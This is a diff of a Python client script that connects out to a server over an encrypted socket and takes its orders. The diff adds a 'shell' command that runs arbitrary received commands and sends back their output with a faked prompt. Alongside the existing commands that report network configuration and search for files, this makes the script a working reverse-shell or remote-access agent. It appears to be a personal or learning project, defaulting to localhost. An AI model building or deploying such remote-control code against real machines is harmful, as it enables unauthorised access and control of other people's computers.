@@ -1,75 +1,54 @@
 #!/usr/bin/python3
 from sys import argv
-import socket
-import rsa
-from cryptography.fernet import Fernet
-MSGLEN=4294967296
 from platform import system as find_system
-from subprocess import check_output, DEVNULL, PIPE, run
+import os
+from subprocess import check_output, DEVNULL, PIPE, run, Popen
+from secure_socket import Client, HOSTNAME
+from time import sleep
 
-class Linux:
+class Computer:
+  def shell(self, socket):
+    origin=os.getcwd()
+    socket.send(self.get_prompt())
+    cmd=socket.receive()
+    while cmd != 'exit':
+      try:
+        output = run(cmd.split(' '), check=False, stdout=PIPE, stderr=PIPE, timeout=5)
+        out=output.stdout.decode("utf-8")
+        err=output.stderr.decode("utf-8")
+        socket.send(f"{out}{err}")
+      except:
+        socket.send('')
+      sleep(0.1)
+      if cmd.split(' ')[0] == "cd":
+        os.chdir(cmd[3:])
+      socket.send(self.get_prompt())
+      cmd=socket.receive()
+    os.chdir(origin)
+
+class Linux(Computer):
   def ipconfig(self):
     return check_output(["ip", "a"]).decode('utf-8')
+  
+  def get_prompt(self):
+    user=os.getlogin()
+    path=os.getcwd()
+    if user=='root':
+      end="#"
+    else:
+      home=f'/home/{user}'
+      if path.startswith(home):
+        path=home.join(path.split(home)[1:])
+        path=f"~{path}"
+      end="$"
+    return f"[{user}@{HOSTNAME}:{path}] {end} "
   
   def search(self, filename, path):
       return run(['find', path, '-name', filename], stderr=DEVNULL, stdout=PIPE).stdout.decode("utf-8").strip()
     
-              
-class Windows:
+class Windows(Computer):
   def ipconfig(self):
     return check_output(["ipconfig"]).decode('utf-8')
-
-class SecureSocket:
-  def __init__(self, host="127.0.0.1", port=62832):
-    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-      self.sock.connect((host, port))
-    except:
-      exit("Server unreachable.")
-    connection_key=rsa.PublicKey.load_pkcs1(self.sock.recv(2048))
-    key = Fernet.generate_key()
-    encrypted_key=rsa.encrypt(key, connection_key)
-    self.sock.send(encrypted_key)
-    self.key = Fernet(key)
-    match find_system():
-      case "Linux":
-        self.system=Linux()
-      case "Windows":
-        self.system=Windows()
-      case _:
-        exit('OS not supported.')
-
-  def send(self, message):
-    msg=self.key.encrypt(str(message).encode('utf-8'))
-    self.sock.send(msg)
-
-  def send_text(self, bytes_array):
-    self.send(len(bytes_array))
-    for line in bytes_array:
-      self.send(line)
-
-  def receive(self):
-    msg=self.sock.recv(MSGLEN)
-    message=self.key.decrypt(msg).decode('utf-8')
-    return message
-  
-  def get_params(self):
-    return self.receive().split(" ")
-
-  def wait_for_cmd(self):
-    using=True
-    while using:
-      match self.receive():
-        case "ip":
-          self.send(self.system.ipconfig())
-        case "search":
-          filename,path = self.get_params()
-          self.send(self.system.search(filename,path))
-        case "exit":
-          using=False
-        case _:
-          print("unknown")
-    self.sock.close()
 
 if __name__ == "__main__":
   try:
@@ -78,6 +57,33 @@ if __name__ == "__main__":
       port=62832
   except:
     port=62832
-  sock=SecureSocket(port=port)
-  sock.wait_for_cmd()
-  print("exit")
+  
+  system=None
+  match find_system():
+    case "Linux":
+      system=Linux()
+    case "Windows":
+      system=Windows()
+    case _:
+      exit('OS not supported.')
+  
+  try:
+    socket=Client(port=port)
+  except:
+    exit("Server unreachable.")
+  
+  using=True
+  while using:
+    match socket.receive():
+      case "ip":
+        socket.send(system.ipconfig())
+      case "shell":
+        system.shell(socket)
+      case "search":
+        filename, path = socket.get_params()
+        socket.send(system.search(filename,path))
+      case "exit":
+        using=False
+      case _:
+        print("unknown")
+  socket.disconnect()
